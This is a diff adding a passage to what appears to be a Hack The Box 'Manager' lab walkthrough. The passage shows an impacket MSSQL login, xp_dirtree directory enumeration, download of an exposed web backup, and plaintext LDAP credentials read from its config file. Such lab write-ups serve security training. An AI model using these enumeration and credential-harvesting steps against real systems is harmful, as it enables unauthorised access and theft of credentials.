@@ -170,7 +170,63 @@ using netexec to check for access on mssql server, we can see we have access to 
 impacket-mssqlclient manager.htb/operator:operator@10.129.22.154 -windows-auth
 ```
 
-using impacket script `impacket-mssqlclient` to login as user operator to the mssql server. 
+using impacket script `impacket-mssqlclient` to login as user operator to the mssql server. let's find a way to get shell.
 
 ![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/c19f3e82-63c6-4cbe-baf2-e68eae6d3ca1)
+
+```mssql
+exec master.dbo.xp_dirtree 'C:\', 1, 1;
+exec master.dbo.xp_dirtree 'C:\inetpub\', 1, 1;
+exec master.dbo.xp_dirtree 'C:\inetpub\wwwroot', 1, 1;
+```
+
+enumerating the xp_cmdshell, we don't have enough privilege to use the xp_cmdshell command. so we use `xp_dirtree` to list directories, found a web backup  `website-backup-27-07-23-old.zip` file in the root path of the web app. 
+
+```shell
+┌──(n16hth4wk👽n16hth4wk-sec)-[~/Documents/HTB/Manager]
+└─$ wget http://manager.htb/website-backup-27-07-23-old.zip            
+--2024-02-21 16:56:53--  http://manager.htb/website-backup-27-07-23-old.zip
+Resolving manager.htb (manager.htb)... 10.129.22.154
+Connecting to manager.htb (manager.htb)|10.129.22.154|:80... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 1045328 (1021K) [application/x-zip-compressed]
+Saving to: ‘website-backup-27-07-23-old.zip’
+
+website-backup-27-07-23-old.zip        100%[============================================================================>]   1021K  90.2KB/s    in 30s     
+
+2024-02-21 16:57:23 (34.1 KB/s) - ‘website-backup-27-07-23-old.zip’ saved [1045328/1045328]
+```
+download the backup file into our host.
+
+![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/4da4621e-f0b8-4655-af22-f4fed92d76c6)
+
+extract the content of the zip file. 
+
+```shell
+┌──(n16hth4wk👽n16hth4wk-sec)-[~/Documents/HTB/Manager/backup]
+└─$ cat .old-conf.xml 
+<?xml version="1.0" encoding="UTF-8"?>
+<ldap-conf xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
+   <server>
+      <host>dc01.manager.htb</host>
+      <open-port enabled="true">389</open-port>
+      <secure-port enabled="false">0</secure-port>
+      <search-base>dc=manager,dc=htb</search-base>
+      <server-type>microsoft</server-type>
+      <access-user>
+         <user>raven@manager.htb</user>
+         <password>R4v3nBe5tD3veloP3r!123</password>
+      </access-user>
+      <uid-attribute>cn</uid-attribute>
+   </server>
+   <search type="full">
+      <dir-list>
+         <dir>cn=Operator1,CN=users,dc=manager,dc=htb</dir>
+      </dir-list>
+   </search>
+</ldap-conf>
+```
+found a file `.old-conf.xml` which contain potential ldap credential. 
+
+
 
